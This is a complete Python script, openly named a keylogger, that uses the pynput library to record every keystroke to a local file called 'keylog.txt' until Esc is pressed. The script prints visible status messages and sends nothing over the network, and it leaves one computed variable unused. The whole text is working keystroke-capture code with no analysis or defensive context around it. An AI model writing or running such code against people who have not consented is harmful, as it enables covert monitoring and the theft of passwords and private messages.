from pynput import keyboard

# File to store logged keys
log_file = "keylog.txt"

# Function to write keys to a file
def write_to_file(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char) + "\n")
    except AttributeError:
        # Handle special keys like space, enter, etc.
        with open(log_file, "a") as f:
            special_key = str(key).replace("Key.", "").upper()
            f.write(str(key) +"\n")

# Listener for keypress
def on_press(key):
    write_to_file(key)

# Stop listener when 'Esc' is pressed
def on_release(key):
    if key == keyboard.Key.esc:
        print("⏹ Keylogger stopped.")
        return False

# Start the keylogger
print("🟢 Keylogger is running... (Press ESC to stop)")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()